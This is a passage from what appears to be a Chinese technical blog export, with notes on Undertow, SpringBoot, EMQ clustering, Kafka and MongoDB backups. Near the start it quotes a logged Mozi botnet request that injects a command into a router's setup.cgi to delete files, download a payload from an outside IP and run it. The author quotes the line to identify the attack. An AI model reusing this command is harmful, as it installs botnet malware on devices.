<p>加上UndertowWebServerCustomizerConfig，有以下两点变化：</p>
<ul>
<li>项目Java中不会抛异常</li>
<li>HTTP响应状态码由500变为405(Method not allowed)</li>
</ul>
<h3 id="5-其他"><a href="#5-其他" class="headerlink" title="5. 其他"></a>5. 其他</h3><p>通过容器的日志，发现这样一条记录：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">179.42.105.0 - - [11/Oct/2021:17:26:18 +0800] <span class="string">"GET /setup.cgi?next_</span></span><br><span class="line"><span class="string">file=netgear.cfg&amp;todo=syscmd&amp;cmd=rm+-rf+/tmp/*;wget+http://179.42.107.161:52500/</span></span><br><span class="line"><span class="string">Mozi.m+-O+/tmp/netgear;sh+netgear&amp;curpath=/&amp;currentsetting.htm=1 HTTP/1.0"</span> 404 119</span><br></pre></td></tr></table></figure></p>
<p>这是 Mozi 僵尸网络，专门攻击路由器的，详情请看<a href="https://new.qq.com/omn/20210824/20210824A04YZQ00.html" target="_blank" rel="noopener">【Mozi僵尸网络可攻击华为、中兴IoT设备】</a></p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>Undertow</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建SpringBoot initializer构建服务器</title>
    <url>/SpringBoot/%E6%90%AD%E5%BB%BASpringBoot%20initializer%E6%9E%84%E5%BB%BA%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<ol>
<li><p>下载工程</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/spring-io/initializr.git</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>构建打包</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> initializr/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mvn compile</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mvn package -Dmaven.test.skip=<span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者直接一条命令安装到本地maven库</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mvn clean install -Pfull</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>运行</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> package打包，在initializr-service/target/下可以找到jar包</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> install的在 ~/.m2/repository/io/spring/initializr/initializr-service/x.x.x.BUILD-SNAPSHOT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> java -jar init.jar --server.port=8089</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>OK</p>
</li>
</ol>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud和Dubbo如何选择</title>
    <url>/SpringCloud/SpringCloud%E5%92%8CDubbo%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9/</url>
    <content><![CDATA[<blockquote>
<p>摘：可能很多人正在犹豫，在服务治理的时候应该选择那个框架呢？如果公司对效率有极高的要求建议使用 Dubbo，相对比 RPC 的效率会比 HTTP 高很多；如果团队不想对技术架构做大的改造建议使用 Dubbo，Dubbo 仅仅需要少量的修改就可以融入到内部系统的架构中。但如果技术团队喜欢挑战新技术，建议选择 Spring Cloud，Spring Cloud 架构体系有有趣很酷的技术。如果公司选择微服务架构去重构整个技术体系，那么 Spring Cloud 是当仁不让之选，它可以说是目前最好的微服务框架没有之一。——出自《<a href="http://www.ityouknow.com/springcloud/2017/11/20/dubbo-update-again.html" target="_blank" rel="noopener">阿里Dubbo疯狂更新，关Spring Cloud什么事？</a>》</p>
</blockquote>
<p>Dubbo性能高（RPC ），轻量级，设计的也很自由，开发者可以各种DIY，比如，他的注册中心，甚至可以用Redis来做。</p>
<p>Spring Cloud 是一个生态，要使用各种组件来组成整个服务，因为服务之间是基于HTTP通讯的，所以没有RPC 那么高效率，求的是一个稳。</p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>中小型项目可以用Dubbo来快速实现，而且现在Dubbo已经支持SpringBoot。</p>
<p>长期发展（扩展）的项目，Spring Cloud是一个不错的选择。</p>
]]></content>
      <categories>
        <category>SpringCloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud学习资料整理</title>
    <url>/SpringCloud/SpringCloud%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<ol>
<li><p>spring-cloud-examples</p>
<p> <a href="https://github.com/ityouknow/spring-cloud-examples" target="_blank" rel="noopener">Github</a></p>
</li>
<li><p>SpringCloud入门系列(第 001 篇)</p>
<p> <a href="https://blog.csdn.net/ylimh_hmily/article/details/78008401" target="_blank" rel="noopener">博客</a></p>
</li>
<li><p>Spring Cloud入门到实战系列教程(猿天地尹吉欢)</p>
<p><a href="http://cxytiandi.com/blog/detail/17470" target="_blank" rel="noopener">博客</a></p>
</li>
<li><p>Java生态研究(Spring Boot + Redis + Dubbo + RocketMQ)</p>
<p> <a href="https://github.com/javahongxi/whatsmars" target="_blank" rel="noopener">Github</a></p>
</li>
<li><p>基于Spring+SpringMVC+Mybatis分布式敏捷开发系统架构(参考实战)</p>
<p> <a href="https://github.com/shuzheng/zheng" target="_blank" rel="noopener">Github</a></p>
</li>
<li><p>spring cloud 脚手架</p>
<p> <a href="https://github.com/SpringForAll/springcloud-thoth" target="_blank" rel="noopener">Github</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>SpringCloud</category>
      </categories>
  </entry>
  <entry>
    <title>Apache-Maven-入门</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Apache-Maven-%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p><a href="http://www.oracle.com/technetwork/cn/community/java/apache-maven-getting-started-1-406235-zhs.html" target="_blank" rel="noopener">Apache Maven 入门篇 ( 上 )</a><br>本文着重动手，用 maven 来构建运行 hellow world 程序，体会一下不用任何 IDE ，只用 maven 是咋回事。</p>
<p><a href="http://www.oracle.com/technetwork/cn/community/java/apache-maven-getting-started-2-405568-zhs.html" target="_blank" rel="noopener">Apache Maven 入门篇(下)</a></p>
<pre><code>* POM (Project Object Model)
* Maven 插件
* Maven 生命周期
* Maven 依赖管理
* Maven 库
</code></pre><p>我的 Maven Setting.xml 的mirrors配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun public maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>public<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun central maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>ui<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://uk.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>jboss-public-repository-group<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>JBoss Public Repository Group<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repository.jboss.org/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>Nginx + EMQ负载均衡</title>
    <url>/Web%E5%90%8E%E7%AB%AF/EMQ+Nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
    <content><![CDATA[<p>环境和实现效果：</p>
<ol>
<li>两台服务器安装EMQ实例监听1883端口（两个EMQ节点要做集群）</li>
<li>一台负载均衡服务器NGINX监听1883端口</li>
<li>客户端连接负载均衡服务器，连接分配到EMQ服务器。</li>
</ol>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#TCP负载均衡</span></span><br><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">	<span class="attribute">upstream</span> mqtt1883&#123;</span><br><span class="line">		<span class="attribute">server</span> <span class="number">192.168.0.223:1883</span> weight=<span class="number">1</span>;</span><br><span class="line">		<span class="attribute">server</span> <span class="number">192.168.0.224:1883</span> weight=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="section">server</span> &#123;</span><br><span class="line">		<span class="attribute">listen</span> <span class="number">1883</span>;</span><br><span class="line">		<span class="comment">#proxy_send_timeout 2h;</span></span><br><span class="line">        <span class="comment">#proxy_read_timeout 2h;</span></span><br><span class="line">		<span class="comment">#proxy_connect_timeout 150s;</span></span><br><span class="line">        <span class="comment">#proxy_timeout 150s;</span></span><br><span class="line">		<span class="attribute">proxy_pass</span> mqtt1883;</span><br><span class="line">		<span class="attribute">proxy_buffer_size</span> <span class="number">3M</span>;</span><br><span class="line">        <span class="attribute">tcp_nodelay</span> <span class="literal">on</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>节点加入集群：$ ./bin/emqttd_ctl cluster join <a href="mailto:emq@192.168.0.88" target="_blank" rel="noopener">emq@192.168.0.88</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>EMQX</title>
    <url>/Web%E5%90%8E%E7%AB%AF/EMQX/</url>
    <content><![CDATA[<p>2018年用过EMQ的2.3版本（<a href="../EMQ阿里云集群部署">【EMQ阿里云集群部署】</a>），到现在2022年EMQ已经更新了好多个版本，我也需要重新学习一下。它的项目名称由<code>emqttd</code>改为<code>emqx</code>，目前<code>emqx</code>社区版最新是v4.3.11，完整支持 MQTT V5.0 协议规范，向下兼容 MQTT V3.1 和 V3.1.1。<br>这家公司它现在主推 EMQX Cloud云原生版和企业版，官网上难找到社区开源版的资料了，社区版需要去Github上查找资料，这里也是为了备忘一下，方便后续使用。</p>
<p><a href="https://github.com/emqx/emqx/blob/master/README-CN.md" target="_blank" rel="noopener">【EMQ X Broker Github仓库】</a><br><a href="https://www.emqx.io/zh/downloads" target="_blank" rel="noopener">【下载 EMQ X 开源版】</a><br><a href="https://www.emqx.io/docs/zh/v4.3/getting-started/getting-started.html" target="_blank" rel="noopener">【文档：快速开始使用 EMQ X】</a></p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Start emqx</span><br><span class="line">./bin/emqx start</span><br><span class="line"></span><br><span class="line"># Check Status</span><br><span class="line">./bin/emqx_ctl status</span><br><span class="line"></span><br><span class="line"># Stop emqx</span><br><span class="line">./bin/emqx stop</span><br></pre></td></tr></table></figure>
<h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><ul>
<li>1883 MQTT/TCP 协议端口</li>
<li>8883 MQTT/SSL 协议端口</li>
<li>8083 MQTT/WS 协议端口</li>
<li>8084 MQTT/WSS 协议端口</li>
<li><a href="http://localhost:18083" target="_blank" rel="noopener">http://localhost:18083</a> 来查看你的 Dashboard，默认用户名是 admin，密码是 public，登录可以修改密码或者创建新的用户。</li>
</ul>
<blockquote>
<p>11883 MQTT/TCP 协议内部端口，仅用于本机客户端连接</p>
</blockquote>
<p>更多参考：<a href="https://www.emqx.io/docs/zh/v4.3/getting-started/config.html#listener" target="_blank" rel="noopener">监听端口</a></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>EMQ阿里云集群部署</title>
    <url>/Web%E5%90%8E%E7%AB%AF/EMQ%E9%98%BF%E9%87%8C%E4%BA%91%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<p>环境和实现效果：</p>
<ol>
<li><p>两台阿里云服务器做集群</p>
<p>服务器 1 (主)：内网（10.0.0.1）外网（118.0.0.1）<br>服务器 2 (从)：内网（10.0.0.2）外网（118.0.0.2）</p>
</li>
<li><p>安装emq</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://www.emqx.io/static/brokers/emqttd-ubuntu16.04-v2.3.11.zip</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> unzip emqttd-ubuntu16.04-v2.3.11.zip</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim emqttd/etc/emq.conf</span></span><br><span class="line"></span><br><span class="line">node.name = emq@内网IP </span><br><span class="line">mqtt.allow_anonymous = false</span><br></pre></td></tr></table></figure>
</li>
<li><p>系统调优</p>
<p>切换到root账号操作比较方便</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/security/limits.conf</span></span><br><span class="line">ubuntu soft nofile 65535</span><br><span class="line">ubuntu hard nofile 65535</span><br><span class="line">root soft nofile 65535</span><br><span class="line">root hard nofile 65535</span><br><span class="line">* soft nofile 65536</span><br><span class="line">* hard nofile 65536</span><br><span class="line">* soft nproc 102400</span><br><span class="line">* soft memlock unlimited</span><br><span class="line">* hard memlock unlimited</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sysctl -w fs.file-max=2097152</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysctl -w fs.nr_open=2097152</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> 2097152 &gt; /proc/sys/fs/nr_open</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">ulimit</span> -n 1048576</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/sysctl.conf</span></span><br><span class="line">fs.file-max = 1048576</span><br><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/systemd/system.conf</span></span><br><span class="line">DefaultLimitNOFILE=1048576</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysctl -w net.core.somaxconn=32768</span><br><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=16384</span><br><span class="line">sysctl -w net.core.netdev_max_backlog=16384</span><br><span class="line">sysctl -w net.ipv4.ip_local_port_range=&apos;1000 65535&apos;</span><br><span class="line">sysctl -w net.core.rmem_default=262144</span><br><span class="line">sysctl -w net.core.wmem_default=262144</span><br><span class="line">sysctl -w net.core.rmem_max=16777216</span><br><span class="line">sysctl -w net.core.wmem_max=16777216</span><br><span class="line">sysctl -w net.core.optmem_max=16777216</span><br><span class="line">sysctl -w net.ipv4.tcp_rmem=&apos;1024 4096 16777216&apos;</span><br><span class="line">sysctl -w net.ipv4.tcp_wmem=&apos;1024 4096 16777216&apos;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加入集群</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 以root账号运行</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./bin/emqttd start</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在节点运行</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./bin/emqttd_ctl cluster join emq@10.0.0.1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>退出集群</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">本节点退出集群</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./bin/emqttd_ctl cluster leave</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">从集群删除其他节点</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./bin/emqttd_ctl cluster remove emq@s2.emqtt.io</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>负载均衡</p>
<p>省略</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>ElasticSearch的优势</title>
    <url>/Web%E5%90%8E%E7%AB%AF/ElasticSearch%E7%9A%84%E4%BC%98%E5%8A%BF/</url>
    <content><![CDATA[<ul>
<li><p>ES非常适用于搜索，速度快，使用简单。</p>
</li>
<li><p>全文搜索——一种传统数据库很难实现的功能</p>
</li>
<li><p>非常容易进行分布式 / 集群部署。</p>
</li>
<li><p>想到再写。</p>
</li>
</ul>
<p><a href="https://my.oschina.net/exit/blog/751385" target="_blank" rel="noopener">上车</a></p>
]]></content>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Kafka安装部署</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Kafka%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<p>环境和实现效果：</p>
<ol>
<li>一台虚拟机安装Kafka</li>
<li>本地基于SpringBoot使用Kafka Client</li>
</ol>
<h3 id="安装zookeeper"><a href="#安装zookeeper" class="headerlink" title="安装zookeeper"></a>安装zookeeper</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bogon:~# wget http://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.13/zookeeper-3.4.13.tar.gz</span><br><span class="line">root@bogon:~# tar zxf zookeeper-3.4.13.tar.gz</span><br><span class="line">root@bogon:~/zookeeper-3.4.13/conf# cp zoo_sample.cfg zoo.cfg</span><br><span class="line">root@bogon:~/zookeeper-3.4.13/conf# cd ../bin/</span><br><span class="line">root@bogon:~/zookeeper-3.4.13/bin# ./zkServer.sh start</span><br></pre></td></tr></table></figure>
<h3 id="安装Kafka"><a href="#安装Kafka" class="headerlink" title="安装Kafka"></a>安装Kafka</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bogon:~# wget http://mirrors.cnnic.cn/apache/kafka/2.0.0/kafka_2.12-2.0.0.tgz</span><br><span class="line">root@bogon:~# tar zxf kafka_2.12-2.0.0.tgz</span><br><span class="line">root@bogon:~# cd kafka_2.12-2.0.0/bin/</span><br><span class="line">root@bogon:~/kafka_2.12-2.0.0/bin# ./kafka-server-start.sh ../config/server.properties &amp;</span><br></pre></td></tr></table></figure>
<h3 id="验证端口"><a href="#验证端口" class="headerlink" title="验证端口"></a>验证端口</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bogon:~# netstat -tunlp|egrep "(2181|9092)"</span><br><span class="line">tcp   0   0 0.0.0.0:9092     0.0.0.0:*   LISTEN      38349/java      </span><br><span class="line">tcp   0   0 0.0.0.0:2181     0.0.0.0:*   LISTEN      37342/java</span><br></pre></td></tr></table></figure>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>生产者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bogon:~# ./kafka-console-producer.sh --broker-list localhost:8086 --topic test</span><br></pre></td></tr></table></figure>
<p>消费者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bogon:~# ./kafka-console-consumer.sh --bootstrap-server localhost:8086 --topic test --from-beginning</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">输入消息，回车发送</span></span><br></pre></td></tr></table></figure>
<h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><p>Ubuntu 的 <code>/etc/hosts</code> 文件的配置会导致 Client 连接失败，所以在 Kafka 的 server.properties 文件加入HostName</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">host.name = 192.168.0.223</span><br></pre></td></tr></table></figure>
<h3 id="云部署"><a href="#云部署" class="headerlink" title="云部署"></a>云部署</h3><p>在阿里云上部署时，外网会有端口限制，所以要先确保9092端口是开放的（我部署时9092没开，没有权限开放，只有改为8086）</p>
<p>场景：</p>
<ol>
<li>Kafka独立部署</li>
<li>生产者和消费者在另外一台服务器</li>
<li>本地调试</li>
</ol>
<p>端口虽然开放了，但是要做内网/外网远程连接，本地还是连接不了Kafka，用命令 <code>telnet IP PORT</code> 测试连接。</p>
<blockquote>
<p>我内网虚拟机部署的Kafka没有此问题</p>
</blockquote>
<p>例如：我的阿里云主机外网IP为：<code>10.8.7.0</code> ，在 <code>kafka/config/server.properties</code> 加入以下配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">port=8086</span><br><span class="line">listeners=PLAINTEXT://0.0.0.0:8086</span><br><span class="line">advertised.listeners=PLAINTEXT://10.8.7.0:8086</span><br><span class="line">advertised.host.name=10.8.7.0.9</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>Letsencrypt证书脚本acme.sh</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Letsencrypt%E8%AF%81%E4%B9%A6%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p><a href="https://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E" target="_blank" rel="noopener">acme.sh</a> 可以从 letsencrypt 生成免费的证书,自动更新.</p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>MongoDb备份&amp;恢复数据</title>
    <url>/Web%E5%90%8E%E7%AB%AF/MongoDb%E5%A4%87%E4%BB%BD&amp;%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<p>记录通过命令行备份和恢复的过程</p>
<h3 id="本地备份"><a href="#本地备份" class="headerlink" title="本地备份"></a>本地备份</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">MongoDB shell version v3.6.3</span><br><span class="line">connecting to: mongodb://127.0.0.1:27017</span><br><span class="line">MongoDB server version: 3.6.3</span><br><span class="line">Welcome to the MongoDB shell.</span><br><span class="line">&gt; show dbs</span><br><span class="line">admin         0.000GB</span><br><span class="line">mshop         0.000GB</span><br><span class="line">jeel          0.001GB</span><br><span class="line"><span class="built_in">local</span>         0.000GB</span><br><span class="line">home          0.001GB</span><br><span class="line">pymongo_test  0.000GB</span><br><span class="line">&gt; <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">bye</span></span><br><span class="line">$ mongodump -h localhost -d mshop -o ./</span><br><span class="line">$ mongodump -h localhost -d pymongo_test -o ./</span><br><span class="line">$ ls</span><br><span class="line">mshop pymongo_test</span><br></pre></td></tr></table></figure>
<p>这里备份了两个数据库，分别在两个目录下。</p>
<p>这里是将两个目录迁移到另外一个服务器，执行以下操作：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mshop</span><br><span class="line">$ mongorestore -h localhost -d mshop ./</span><br><span class="line">$ <span class="built_in">cd</span> ../pymongo_test</span><br><span class="line">$ mongorestore -h localhost -d pymongo_test ./</span><br></pre></td></tr></table></figure></p>
<h3 id="授权模式"><a href="#授权模式" class="headerlink" title="授权模式"></a>授权模式</h3><p>如果mongodb开启了授权模式，则需要用户和密码，按照以下格式输入：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mongodump -h localhost -d mshop --username zhangsan --password &apos;123456&apos; --port 3717 -o ./</span><br></pre></td></tr></table></figure></p>
<h3 id="远程服务器"><a href="#远程服务器" class="headerlink" title="远程服务器"></a>远程服务器</h3><p>如果出现以下错误：</p>
<blockquote>
<p>Failed: error writing data for collection <code>test.user</code> to disk: error reading collection: Failed to parse: { find: “user”, skip: 0, snapshot: true, $readPreference: { mode: “secondaryPreferred” }, $db: “test” }. Unrecognized field ‘snapshot’.</p>
</blockquote>
<p>是因为本地mongodump版本和数据库的不一样，这种问题一般出现远程数据库服务器。解决办法有两种：</p>
<ul>
<li>修改mongodump的版本和目标数据库一样</li>
<li><code>--forceTableScan</code> 强制备份 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mongodump -h localhost -d mshop --username zhangsan --password &apos;123456&apos; --port 3717 --forceTableScan -o ./</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>Mongodb开机自启动脚本</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Mongodb%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p><a href="http://blog.csdn.net/junbujianwpl/article/details/51934009" target="_blank" rel="noopener">http://blog.csdn.net/junbujianwpl/article/details/51934009</a></p>
<p><a href="https://kelvin.mbioq.com/2016/11/12/ubuntu1610-on-the-installation-of-server-mongodb.html" target="_blank" rel="noopener">https://kelvin.mbioq.com/2016/11/12/ubuntu1610-on-the-installation-of-server-mongodb.html</a></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>MQTT Broker Moquette</title>
    <url>/Web%E5%90%8E%E7%AB%AF/MQTT%20Broker%20Moquette/</url>
    <content><![CDATA[<h2 id="Moquette"><a href="#Moquette" class="headerlink" title="Moquette"></a>Moquette</h2><p><a href="https://github.com/moquette-io/moquette" target="_blank" rel="noopener">Moquette</a>是一款开源的MQTT消息代理，整个系统基于java开发，以netty编解码为基础完整实现了MQTT协议的，可以嵌入到你自己的项目中使用。</p>
<h2 id="其他项目"><a href="#其他项目" class="headerlink" title="其他项目"></a>其他项目</h2><p><a href="https://github.com/moquette-io/netty-mqtt5-codec" target="_blank" rel="noopener">netty-mqtt5-codec</a><br><a href="https://github.com/irubant/moquette" target="_blank" rel="noopener">Moquette的改进项目</a></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>MQ产品对比</title>
    <url>/Web%E5%90%8E%E7%AB%AF/MQ%E4%BA%A7%E5%93%81%E5%AF%B9%E6%AF%94/</url>
    <content><![CDATA[<blockquote>
<p>参考资料：</p>
<p><a href="https://www.cnblogs.com/Sonet-life/p/6957822.html" target="_blank" rel="noopener">MQ产品比较-ActiveMQ-RocketMQ</a></p>
<p><a href="https://blog.csdn.net/oMaverick1/article/details/51331004" target="_blank" rel="noopener">MQ选型对比文档</a></p>
<p><a href="http://www.infoq.com/cn/news/2017/02/RocketMQ-future-idea" target="_blank" rel="noopener">专访RocketMQ联合创始人：项目思路、技术细节和未来规划</a></p>
</blockquote>
<h4 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h4><p>Java开发的，Apache的项目，是JMS规范的参考实现，也是Apache旗下的老牌消息服务引擎，在该Apache顶级项目下拥有不少子项目，包括由HornetMQ演变而来的Artemis，基于Scala号称下一代AMQ的<code>Apollo</code>等。</p>
<blockquote>
<p>官网介绍：Apollo 是一个更快、更可靠、更容易维护的消息代理，它是由最初的ActiveMQ的基础构建的。它使用一个完全不同的线程和消息调度架构来实现这一点。与ActiveMQ一样，Apollo 是一个多协议代理，支持 STOMP、AMQP、MQTT、Openwire、SSL 和 WebSockets 。</p>
</blockquote>
